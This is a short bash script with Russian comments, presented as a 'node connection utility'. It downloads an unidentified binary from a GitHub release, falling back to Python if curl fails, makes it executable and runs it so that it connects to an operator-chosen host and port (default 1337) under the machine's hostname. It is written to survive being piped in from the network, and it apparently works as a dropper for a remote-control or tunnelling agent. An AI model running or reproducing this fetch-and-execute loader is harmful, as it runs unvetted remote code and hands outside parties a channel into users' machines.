#!/usr/bin/env bash
# Утилита связи узлов.
# Запуск:  HOST=1.2.3.4 PORT=1337 bash start.sh
set -euo pipefail

HOST="${HOST:-127.0.0.1}"
PORT="${PORT:-1337}"
NAME="${NAME:-$(hostname 2>/dev/null || echo node)}"
DL="${DL:-https://github.com/udneffiiasd-duser/netkit-go/releases/download/v1.0.0/linker}"

# Рабочая папка: текущая директория (или ~/netkit), НЕ /dev/fd при process substitution.
WORK="${WORK:-$PWD}"
if [[ -z "$WORK" || "$WORK" == /dev/fd* || "$WORK" == /proc/* ]]; then
  WORK="$HOME/netkit"
fi
mkdir -p "$WORK"
cd "$WORK"

if [[ ! -x ./linker ]]; then
  echo "[*] загрузка linker в $WORK"
  if ! curl -fsSL "$DL" -o linker.tmp; then
    echo "[!] не удалось скачать, пробую через python"
    python3 - "$DL" <<'PY'
import sys,urllib.request
urllib.request.urlretrieve(sys.argv[1], "linker.tmp")
PY
  fi
  chmod +x linker.tmp && mv -f linker.tmp linker
fi

echo "[*] узел $NAME -> $HOST:$PORT"
exec ./linker -h "$HOST" -p "$PORT" -id "$NAME"
